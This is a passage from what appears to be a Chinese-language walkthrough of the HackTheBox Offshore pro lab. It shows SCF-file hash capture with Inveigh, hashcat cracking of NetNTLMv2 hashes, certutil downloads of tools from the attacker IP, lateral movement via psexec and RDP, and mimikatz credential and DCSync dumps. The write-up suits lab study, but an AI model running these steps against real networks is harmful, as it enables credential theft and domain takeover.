    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.2]
    Responder IPv6             [fe80::d470:35d6:fea6:16c]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-R3FARX1H6AL]
    Responder Domain Name      [5PK3.LOCAL]
    Responder DCE-RPC Port     [48444]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...  
```

ok没成功，可能是拦截10.10.16.2的路由了

尝试在靶机上启动个windows-respond

[Windows版本-Respond](https://github.com/Kevin-Robertson/Inveigh)

#### DC03下载Inveigh 
```c
certutil -urlcache -f http://10.10.16.2/Inveigh.exe Inveigh.exe
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# vi test.scf
                                                                                                                                                                                                                   
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# cat test.scf  
[Shell]
Command=2
IconFile=\\172.16.3.5\share\1.ico
[Taskbar]
Command=ToggleDesktop                            
```

```c
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\Inveigh.exe
```

这里我第一遍上传没收到，然后我重起了个终端进入smb重新上传

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q impacket-smbclient ADMIN.OFFSHORE.COM/bankvault@172.16.4.31 -hashes :0ce1cb01ade331cdba32d0e1fba338a1

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
Banking_Data
C$
IPC$
# use Banking_Data
# put test.scf
```

```c
[+] [10:11:31] SMB(445) NTLMv2 captured for [ADMIN.OFFSHORE.COM\bankvault] from 172.16.3.5():49475:
bankvault::ADMIN.OFFSHORE.COM:C12A7CE7ACCDFB6B:B39C790CCD9002AABA59EDC93925C2A9:01010000000000001041FF9FCEAFDC01756F6445454D53740000000002000C0043004C00490045004E005400010008004D005300300032000400260043004C00490045004E0054002E004F0046004600530048004F00520045002E0043004F004D00030030004D005300300032002E0043004C00490045004E0054002E004F0046004600530048004F00520045002E0043004F004D000500260043004C00490045004E0054002E004F0046004600530048004F00520045002E0043004F004D00070008001041FF9FCEAFDC0109003A0063006900660073002F004D005300300032002E0043004C00490045004E0054002E004F0046004600530048004F00520045002E0043004F004D0000000000
```

**NTLMv2 Hash**，格式是：

```plain
username::domain:server_challenge:NTLMv2_response:blob
```

#### hashcat
```c
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

没跑出来，再抓一次

抓之前需要删除日志，如果日志不删除,第二次是不会中继相同的hash的

```c
Inveigh-Log.txt
Inveigh-NTLMv2.txt
Inveigh-NTLMv2Users.txt
*Evil-WinRM* PS C:\Users\Administrator\Documents> Remove-Item *.txt -Force
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\Inveigh.exe
```

```c
# put test.scf
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q impacket-smbclient \
ADMIN.OFFSHORE.COM/bankvault@172.16.4.31 \
-hashes :0ce1cb01ade331cdba32d0e1fba338a1
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
Banking_Data
C$
IPC$
```

上传后需要退出重新smbclient连接

```c
[+] [10:31:37] SMB(445) NTLMv2 captured for [ADMIN.OFFSHORE.COM\bankvault] from 172.16.3.5():50020:
bankvault::ADMIN.OFFSHORE.COM:4F2D2379DF599118:BD91042382427970015BE46036238719:01010000000000009696DB6ED1AFDC014E6148416D356F4B0000000002000C0043004C00490045004E005400010008004D005300300032000400260043004C00490045004E0054002E004F0046004600530048004F00520045002E0043004F004D00030030004D005300300032002E0043004C00490045004E0054002E004F0046004600530048004F00520045002E0043004F004D000500260043004C00490045004E0054002E004F0046004600530048004F00520045002E0043004F004D00070008009696DB6ED1AFDC0109003A0063006900660073002F004D005300300032002E0043004C00490045004E0054002E004F0046004600530048004F00520045002E0043004F004D0000000000
```

......找到原因

发现我们为啥抓取的是自身bankvault啊????

我服了...怪不得需要上传完重进

#### 抓取失败原因
+ 当你使用 impacket-smbclient 连接到 Banking_Data 并在里面处于交互模式（没有 exit）时，你的工具在底层与 MS02 保持着一个活跃的 SMB 树连接（Tree Connect），甚至可能对该目录持有一个文件/目录句柄（Handle）。
+ 靶场 MS02 上的那个模拟管理员（Bot），实际上是一个计划任务（Scheduled Task），它可能每 5 分钟运行一个类似 del /Q /S C:\Banking_Data\* 的脚本。
+ 当脚本尝试去读取或清理这个目录时，发现目录正在被你的 smbclient 占用。Windows 会直接抛出一个 “Sharing Violation（共享冲突/文件被占用）” 的报错，然后脚本就异常退出了。
+ 这就是为什么你等了快一个小时，目标却毫无动静的原因——你把门堵死了，目标进不来！

#### 正确抓取方式
+ 清理战场：  
在 smbclient 里执行 rm test.scf，把旧的删掉，确保目录干干净净。  
在 DC03 的 Evil-WinRM 里执行 Remove-Item *.txt -Force 清理 Inveigh 日志。
+ 重新开启监听：  
在 DC03 上运行 .\Inveigh.exe。
+ 放置诱饵并“光速撤退”：  
在 Kali 上使用 smbclient 上传文件：

```plain
# use Banking_Data
# put test.scf
# exit    <--- 注意！传完立刻敲 exit 断开连接！绝对不要停留！
```

+ 静默等待（不要碰 MS02！）：  
现在，MS02 上的 Banking_Data 目录没有任何锁定了。  
切回 DC03 的窗口，盯住屏幕，不要再去对 MS02 敲任何 dir 或 ls 命令。  
最多 5 分钟，那个名为 offshore_adm 的“倒霉蛋”计划任务就会如约而至，踩中你的 SCF 地雷！

```c
[+] [10:56:20] SMB(445) NTLMv2 captured for [CLIENT\offshore_adm] from 172.16.4.31(MS02):50356:
offshore_adm::CLIENT:BD7C48A709883BAB:F8CE4BABE1ACC484475C0ECA3A5EDD3C:0101000000000000DFE5A0E3D4AFDC01561C2592317712910000000002000A00410044004D0049004E0001000800440043003000330004002400410044004D0049004E002E004F0046004600530048004F00520045002E0043004F004D0003002E0044004300300033002E00410044004D0049004E002E004F0046004600530048004F00520045002E0043004F004D0005002400410044004D0049004E002E004F0046004600530048004F00520045002E0043004F004D0007000800DFE5A0E3D4AFDC010600040002000000080030003000000000000000000000000020000072833FEF4898A4ED194AECC6EB8462FEFEA7B8E92246A407E2D359FEF4F0F87F0A0010000000000000000000000000000000000009001E0063006900660073002F003100370032002E00310036002E0033002E0035000000000000000000
```

#### hashcat
```c
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

OFFSHORE_ADM::CLIENT:bd7c48a709883bab:f8ce4babe1acc484475c0eca3a5edd3c:0101000000000000dfe5a0e3d4afdc01561c2592317712910000000002000a00410044004d0049004e0001000800440043003000330004002400410044004d0049004e002e004f0046004600530048004f00520045002e0043004f004d0003002e0044004300300033002e00410044004d0049004e002e004f0046004600530048004f00520045002e0043004f004d0005002400410044004d0049004e002e004f0046004600530048004f00520045002e0043004f004d0007000800dfe5a0e3d4afdc010600040002000000080030003000000000000000000000000020000072833fef4898a4ed194aecc6eb8462fefea7b8e92246a407e2d359fef4f0f87f0a0010000000000000000000000000000000000009001e0063006900660073002f003100370032002e00310036002e0033002e0035000000000000000000:Banker!123
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: OFFSHORE_ADM::CLIENT:bd7c48a709883bab:f8ce4babe1acc...000000
Time.Started.....: Mon Mar  9 10:58:15 2026 (0 secs)
Time.Estimated...: Mon Mar  9 10:58:15 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (test.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:     1301 H/s (0.01ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1/1 (100.00%)
Rejected.........: 0/1 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: Banker!123 -> Banker!123
Hardware.Mon.#01.: Util: 17%
```

得到凭据OFFSHORE_ADM\Banker!123

### OFFSHORE_ADM
#### evil-winrm(失败)
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q evil-winrm -i 172.16.4.31 -u OFFSHORE_ADM -p 'Banker!123'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\> whoami
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1

```

#### impacket-psexec(失败)
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q impacket-psexec ADMIN.OFFSHORE.COM/OFFSHORE_ADM:'Banker!123'@172.16.4.31
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] SMB SessionError: code: 0xc000006d - STATUS_LOGON_FAILURE - The attempted logon is invalid. This is either due to a bad username or authentication information.                            
```

#### impacket-wmiexec(失败)
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q impacket-wmiexec ADMIN.OFFSHORE.COM/OFFSHORE_ADM:'Banker!123'@172.16.4.31
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] SMB SessionError: code: 0xc000006d - STATUS_LOGON_FAILURE - The attempted logon is invalid. This is either due to a bad username or authentication information.                                      
```

#### rdp(成功)
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q crackmapexec smb 172.16.4.31 -u offshore_adm -p 'Banker!123' -d CLIENT
SMB         172.16.4.31     445    MS02             [*] Windows 10 / Server 2016 Build 14393 x64 (name:MS02) (domain:CLIENT) (signing:False) (SMBv1:False)
SMB         172.16.4.31     445    MS02             [+] CLIENT\offshore_adm:Banker!123 
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q xfreerdp /u:CLIENT\\offshore_adm /p:'Banker!123' /v:172.16.4.31 /cert:ignore /tls:seclevel:0 /size:1280x960
```

![](/image/prolabs/Offshore-77.png)



# 172.16.3.103(Windows)（Setp:11-Getflag）
## 端口扫描
```c
*Evil-WinRM* PS C:\Users\Administrator\Documents> $ip = "172.16.3.103"
$ports = 1..15000
$runspacePool = [runspacefactory]::CreateRunspacePool(1,100)
$runspacePool.Open()
$jobs = @()
foreach ($port in $ports) {
    $ps = [powershell]::Create()
    $ps.RunspacePool = $runspacePool
    $ps.AddScript({
        param($ip,$port)
        try{
            $client = New-Object System.Net.Sockets.TcpClient
            $iar = $client.BeginConnect($ip,$port,$null,$null)
            if($iar.AsyncWaitHandle.WaitOne(200)){
                $client.EndConnect($iar)
                "Port open $port"
            }
            $client.Close()
        }catch{}
    }).AddArgument($ip).AddArgument($port) | Out-Null
    $job = @{
        Pipe = $ps
        Result = $ps.BeginInvoke()
    }
    $jobs += $job
}
foreach($job in $jobs){
    $output = $job.Pipe.EndInvoke($job.Result)
    if($output){
        $output
    }
}
$runspacePool.Close()
$runspacePool.Dispose()
 
Port open 135
Port open 139
Port open 445
Port open 3389
```

## Getflag
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q administrator@172.16.3.103 -hashes :f2594c9e60abf7e28e7601db343a7e24
    
C:\Windows\system32>type \users\administrator\desktop\flag.txt
OFFSHORE{w@tch_th3_for3st_burn}
```

## Getflag
Found a flag in GPO

![](/image/prolabs/Offshore-78.png)

```c
dir \\CLIENT.OFFSHORE.COM\SysVol\CLIENT.OFFSHORE.COM\Policies\{ABBDB649-E74D-4DDB-A6B3-9C1055BE903C}
```

![](/image/prolabs/Offshore-79.png)

![](/image/prolabs/Offshore-80.png)



# 172.16.4.5(Windows)（Setp:13）
## 票据登录
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore/client]
└─# export KRB5CCNAME=ticket.ccache
```

```c
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/offshore/client]
└─# proxychains -q psexec.py -k -no-pass CLIENT.OFFSHORE.COM/administrator@DC04.CLIENT.OFFSHORE.COM
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on DC04.CLIENT.OFFSHORE.COM.....
[*] Found writable share ADMIN$
[*] Uploading file eGrIUBar.exe
[*] Opening SVCManager on DC04.CLIENT.OFFSHORE.COM.....
[*] Creating service rjNG on DC04.CLIENT.OFFSHORE.COM.....
[*] Starting service rjNG.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd C:\Users\Public
```

## mimikatz
### download
```c
certutil -urlcache -f http://10.10.16.2/mimikatz.exe mimikatz.exe
```

### sekurlsa::logonpasswords
```c
sekurlsa::logonpasswords
mimikatz # 
Authentication Id : 0 ; 78217 (00000000:00013189)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)

Logon Time        : 3/8/2026 11:33:43 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DC04$
         * Domain   : CLIENT
         * NTLM     : 10868ab257bff3c2c07f46912d1343cb
         * SHA1     : 421d29c0eea1dafa7ded5bf197c3d0a212455109
        tspkg :
        wdigest :
         * Username : DC04$
         * Domain   : CLIENT
         * Password : (null)
        kerberos :
         * Username : DC04$
         * Domain   : CLIENT.OFFSHORE.COM
         * Password : 3c 48 a8 b0 a5 4a 4a d8 d5 9e 16 9c 79 e0 b2 15 1c b3 9a ca 94 99 70 c7 0f dd 2e 98 01 93 bb e5 d4 c9 ac 4d 48 65 ae 95 5a ea 5a 01 2e 9b f2 df d6 cf a1 f2 1e e4 cf 2a 3e 49 73 c7 4f 85 e2 de c8 a5 2b 31 4a 60 15 35 71 de bf ea 81 c7 22 6f d3 ac 82 38 63 c6 d5 96 f9 2f 46 e5 5b c9 b9 d4 9c 1e b6 5f 2a c6 15 5f eb 0a 55 1a 7b d5 41 77 16 ee 8e 15 7c 19 c6 99 ef 23 6c a1 78 8f 37 98 08 63 3a 8f 59 8a c6 ec a5 9b d5 e5 47 aa e4 f9 5d 40 4e ff ce 7b de 77 3c e0 bc 6e 17 48 f5 ea c5 01 a3 2a e0 8b ee 49 37 01 1c 7f 07 60 82 67 bf 79 b0 98 c5 39 86 42 0e d9 21 54 4a 35 16 ad e0 7a 04 6e 3a a2 3d 74 2a 1b eb 22 0c 4e b6 e2 d1 3d 0c a5 20 d3 da 76 dd aa ae 9e 19 86 d7 5f 66 1a 80 5f 4f 5e 15 e8 12 8a bf f4 2f b5 0a af 
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DC04$
Domain            : CLIENT
Logon Server      : (null)
Logon Time        : 3/8/2026 11:33:41 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : DC04$
         * Domain   : CLIENT
         * NTLM     : 10868ab257bff3c2c07f46912d1343cb
         * SHA1     : 421d29c0eea1dafa7ded5bf197c3d0a212455109
        tspkg :
        wdigest :
         * Username : DC04$
         * Domain   : CLIENT
         * Password : (null)
        kerberos :
         * Username : dc04$
         * Domain   : CLIENT.OFFSHORE.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 36063 (00000000:00008cdf)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 3/8/2026 11:33:25 PM
SID               : 
        msv :
         [00000003] Primary
         * Username : DC04$
         * Domain   : CLIENT
         * NTLM     : 10868ab257bff3c2c07f46912d1343cb
         * SHA1     : 421d29c0eea1dafa7ded5bf197c3d0a212455109
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 78200 (00000000:00013178)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/8/2026 11:33:43 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DC04$
         * Domain   : CLIENT
         * NTLM     : 10868ab257bff3c2c07f46912d1343cb
         * SHA1     : 421d29c0eea1dafa7ded5bf197c3d0a212455109
        tspkg :
        wdigest :
         * Username : DC04$
         * Domain   : CLIENT
         * Password : (null)
        kerberos :
         * Username : DC04$
         * Domain   : CLIENT.OFFSHORE.COM
         * Password : 3c 48 a8 b0 a5 4a 4a d8 d5 9e 16 9c 79 e0 b2 15 1c b3 9a ca 94 99 70 c7 0f dd 2e 98 01 93 bb e5 d4 c9 ac 4d 48 65 ae 95 5a ea 5a 01 2e 9b f2 df d6 cf a1 f2 1e e4 cf 2a 3e 49 73 c7 4f 85 e2 de c8 a5 2b 31 4a 60 15 35 71 de bf ea 81 c7 22 6f d3 ac 82 38 63 c6 d5 96 f9 2f 46 e5 5b c9 b9 d4 9c 1e b6 5f 2a c6 15 5f eb 0a 55 1a 7b d5 41 77 16 ee 8e 15 7c 19 c6 99 ef 23 6c a1 78 8f 37 98 08 63 3a 8f 59 8a c6 ec a5 9b d5 e5 47 aa e4 f9 5d 40 4e ff ce 7b de 77 3c e0 bc 6e 17 48 f5 ea c5 01 a3 2a e0 8b ee 49 37 01 1c 7f 07 60 82 67 bf 79 b0 98 c5 39 86 42 0e d9 21 54 4a 35 16 ad e0 7a 04 6e 3a a2 3d 74 2a 1b eb 22 0c 4e b6 e2 d1 3d 0c a5 20 d3 da 76 dd aa ae 9e 19 86 d7 5f 66 1a 80 5f 4f 5e 15 e8 12 8a bf f4 2f b5 0a af 
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 3/8/2026 11:33:43 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DC04$
Domain            : CLIENT
Logon Server      : (null)
Logon Time        : 3/8/2026 11:33:24 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : DC04$
         * Domain   : CLIENT
         * Password : (null)
        kerberos :
         * Username : dc04$
         * Domain   : CLIENT.OFFSHORE.COM
         * Password : (null)
        ssp :
        credman :
```

### lsadump::sam
```c
mimikatz # Domain : DC04
SysKey : 1c385a588e19901a24e9e8f14c132b13
Local SID : S-1-5-21-1135778286-2399929180-2430333283

SAMKey : ba58ecf81f2928967486bcf956658f21

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 67e1046be5e785dd9773fb6bbeaad49c

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount
```

### lsadump::dcsync
```c
lsadump::dcsync /domain:CLIENT.OFFSHORE.COM /all 
mimikatz # [DC] 'CLIENT.OFFSHORE.COM' will be the domain
[DC] 'DC04.CLIENT.OFFSHORE.COM' will be the DC server
[DC] Exporting domain 'CLIENT.OFFSHORE.COM'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : CLIENT


Object RDN           : LostAndFound


Object RDN           : Deleted Objects


Object RDN           : Users


Object RDN           : Computers


Object RDN           : System


Object RDN           : WinsockServices


Object RDN           : RpcServices


Object RDN           : FileLinks


Object RDN           : VolumeTable


Object RDN           : ObjectMoveTable


Object RDN           : Default Domain Policy


Object RDN           : AppCategories


Object RDN           : Meetings


Object RDN           : Policies


Object RDN           : User


Object RDN           : Machine


Object RDN           : User


Object RDN           : Machine


Object RDN           : RAS and IAS Servers Access Check


Object RDN           : File Replication Service


Object RDN           : Dfs-Configuration


Object RDN           : IP Security


Object RDN           : ipsecPolicy{72385230-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecISAKMPPolicy{72385231-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNFA{72385232-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNFA{59319BE2-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecNFA{594272E2-071D-11D3-AD22-0060B0ECCA17}


Object RDN           : ipsecPolicy{72385236-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecISAKMPPolicy{72385237-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNFA{59319C04-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecPolicy{7238523C-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecISAKMPPolicy{7238523D-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNFA{7238523E-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNFA{59319BF3-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecNFA{6A1F5C6F-72B7-11D2-ACF0-0060B0ECCA17}


Object RDN           : ipsecNFA{594272FD-071D-11D3-AD22-0060B0ECCA17}


Object RDN           : ipsecNegotiationPolicy{59319BDF-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecNegotiationPolicy{59319BF0-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecNegotiationPolicy{59319C01-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecNegotiationPolicy{72385233-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNegotiationPolicy{7238523F-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNegotiationPolicy{7238523B-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecFilter{7238523A-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecFilter{72385235-70FA-11D1-864C-14A300000000}


Object RDN           : ComPartitions


Object RDN           : ComPartitionSets


Object RDN           : WMIPolicy


Object RDN           : PolicyTemplate


Object RDN           : SOM


Object RDN           : PolicyType


Object RDN           : WMIGPO


Object RDN           : DomainUpdates


Object RDN           : Operations


Object RDN           : ab402345-d3c3-455d-9ff7-40268a1099b6


Object RDN           : bab5f54d-06c8-48de-9b87-d78b796564e4


Object RDN           : f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5


Object RDN           : 2416c60a-fe15-4d7a-a61e-dffd5df864d3


Object RDN           : 7868d4c8-ac41-4e05-b401-776280e8e9f1


Object RDN           : 860c36ed-5241-4c62-a18b-cf6ff9994173


Object RDN           : 0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e


Object RDN           : a86fe12a-0f62-4e2a-b271-d27f601f8182


Object RDN           : d85c0bfd-094f-4cad-a2b5-82ac9268475d


Object RDN           : 6ada9ff7-c9df-45c1-908e-9fef2fab008a


Object RDN           : 10b3ad2a-6883-4fa7-90fc-6377cbdc1b26


Object RDN           : 98de1d3e-6611-443b-8b4e-f4337f1ded0b


Object RDN           : f607fd87-80cf-45e2-890b-6cf97ec0e284


Object RDN           : 9cac1f66-2167-47ad-a472-2a13251310e4


Object RDN           : 6ff880d6-11e7-4ed1-a20f-aac45da48650


Object RDN           : 446f24ea-cfd5-4c52-8346-96e170bcb912


Object RDN           : 51cba88b-99cf-4e16-bef2-c427b38d0767


Object RDN           : a3dac986-80e7-4e59-a059-54cb1ab43cb9


Object RDN           : 293f0798-ea5c-4455-9f5d-45f33a30703b


Object RDN           : 5c82b233-75fc-41b3-ac71-c69592e6bf15


Object RDN           : 7ffef925-405b-440a-8d58-35e8cd6e98c3


Object RDN           : 4dfbb973-8a62-4310-a90c-776e00f83222


Object RDN           : 8437C3D8-7689-4200-BF38-79E4AC33DFA0


Object RDN           : 7cfb016c-4f87-4406-8166-bd9df943947f


Object RDN           : f7ed4553-d82b-49ef-a839-2f38a36bb069


Object RDN           : 8ca38317-13a4-4bd4-806f-ebed6acb5d0c


Object RDN           : 3c784009-1f57-4e2a-9b04-6915c9e71961


Object RDN           : 6bcd5678-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5679-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567a-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567b-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567c-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567d-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567e-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567f-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5680-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5681-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5682-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5683-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5684-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5685-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5686-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5687-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5688-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5689-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd568a-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd568b-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd568c-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd568d-8314-11d6-977b-00c04f613221


Object RDN           : 3051c66f-b332-4a73-9a20-2d6a7d6e6a1c


Object RDN           : 3e4f4182-ac5d-4378-b760-0eab2de593e2


Object RDN           : c4f17608-e611-11d6-9793-00c04f613221


Object RDN           : 13d15cf0-e6c8-11d6-9793-00c04f613221


Object RDN           : 8ddf6913-1c7b-4c59-a5af-b9ca3b3d2c4c


Object RDN           : dda1d01d-4bd7-4c49-a184-46f9241b560e


Object RDN           : a1789bfb-e0a2-4739-8cc0-e77d892d080a


Object RDN           : 61b34cb0-55ee-4be9-b595-97810b92b017


Object RDN           : 57428d75-bef7-43e1-938b-2e749f5a8d56


Object RDN           : ebad865a-d649-416f-9922-456b53bbb5b8


Object RDN           : 0b7fb422-3609-4587-8c2e-94b10f67d1bf


Object RDN           : 2951353e-d102-4ea5-906c-54247eeec741


Object RDN           : 71482d49-8870-4cb3-a438-b6fc9ec35d70


Object RDN           : aed72870-bf16-4788-8ac7-22299c8207f1


Object RDN           : f58300d1-b71a-4DB6-88a1-a8b9538beaca


Object RDN           : 231fb90b-c92a-40c9-9379-bacfc313a3e3


Object RDN           : 4aaabc3a-c416-4b9c-a6bb-4b453ab1c1f0


Object RDN           : 9738c400-7795-4d6e-b19d-c16cd6486166


Object RDN           : de10d491-909f-4fb0-9abb-4b7865c0fe80


Object RDN           : b96ed344-545a-4172-aa0c-68118202f125


Object RDN           : 4c93ad42-178a-4275-8600-16811d28f3aa


Object RDN           : c88227bc-fcca-4b58-8d8a-cd3d64528a02


Object RDN           : 5e1574f6-55df-493e-a671-aaeffca6a100


Object RDN           : d262aae8-41f7-48ed-9f35-56bbb677573d


Object RDN           : 82112ba0-7e4c-4a44-89d9-d46c9612bf91


Object RDN           : c3c927a6-cc1d-47c0-966b-be8f9b63d991


Object RDN           : 54afcfb9-637a-4251-9f47-4d50e7021211


Object RDN           : f4728883-84dd-483c-9897-274f2ebcf11e


Object RDN           : ff4f9d27-7157-4cb0-80a9-5d6f2b14c8ff


Object RDN           : 83C53DA7-427E-47A4-A07A-A324598B88F7


Object RDN           : C81FC9CC-0130-4FD1-B272-634D74818133


Object RDN           : E5F9E791-D96D-4FC9-93C9-D53E1DC439BA


Object RDN           : e6d5fd00-385d-4e65-b02d-9da3493ed850


Object RDN           : 3a6b3fbf-3168-4312-a10d-dd5b3393952d


Object RDN           : 7F950403-0AB3-47F9-9730-5D7B0269F9BD


Object RDN           : 434bb40d-dbc9-4fe7-81d4-d57229f7b080


Object RDN           : Windows2003Update


Object RDN           : ActiveDirectoryUpdate


Object RDN           : Password Settings Container


Object RDN           : PSPs


Object RDN           : Domain Controllers


Object RDN           : Infrastructure


Object RDN           : ForeignSecurityPrincipals


Object RDN           : Program Data


Object RDN           : Microsoft


Object RDN           : NTDS Quotas


Object RDN           : Managed Service Accounts


Object RDN           : TPM Devices


Object RDN           : Keys


Object RDN           : Guest

** SAM ACCOUNT **

SAM Username         : Guest
User Account Control : 00010222 ( ACCOUNTDISABLE PASSWD_NOTREQD NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-501
Object Relative ID   : 501

Credentials:

Object RDN           : DefaultAccount

** SAM ACCOUNT **

SAM Username         : DefaultAccount
User Account Control : 00010222 ( ACCOUNTDISABLE PASSWD_NOTREQD NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-524867371-2016665888-3240400722-503
Object Relative ID   : 503

Credentials:

Object RDN           : Builtin


Object RDN           : S-1-5-4


Object RDN           : S-1-5-11


Object RDN           : Remote Desktop Users

** SAM ACCOUNT **

SAM Username         : Remote Desktop Users
Object Security ID   : S-1-5-32-555
Object Relative ID   : 555

Credentials:

Object RDN           : Network Configuration Operators

** SAM ACCOUNT **

SAM Username         : Network Configuration Operators
Object Security ID   : S-1-5-32-556
Object Relative ID   : 556

Credentials:

Object RDN           : Performance Monitor Users

